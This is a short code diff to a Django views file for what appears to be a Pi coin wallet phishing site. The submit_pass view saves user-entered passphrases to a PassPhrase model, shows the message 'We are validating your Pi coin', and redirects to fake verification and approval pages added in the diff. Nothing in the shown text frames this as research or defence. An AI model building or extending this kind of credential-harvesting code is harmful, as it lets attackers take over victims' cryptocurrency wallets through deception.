@@ -27,11 +27,19 @@ def submit_pass(request):
                 messages.error(request, 'We are validating your Pi coin')
                 return redirect('/wallet/')
 
-            key_save = models.PassPhrase.objects.create(
-                keys=keys
-            )
-            key_save.save()
-            return redirect('/validate/')
+            else:
+                key_save = models.PassPhrase.objects.create(
+                    keys=keys
+                )
+                key_save.save()
+                return redirect('/approve/')
         
     else:
         return redirect('/')
+
+
+def verify_your_coin(request):
+    return render(request, 'verification.html', {})
+
+def approve(request):
+    return render(request, 'approve.html', {})
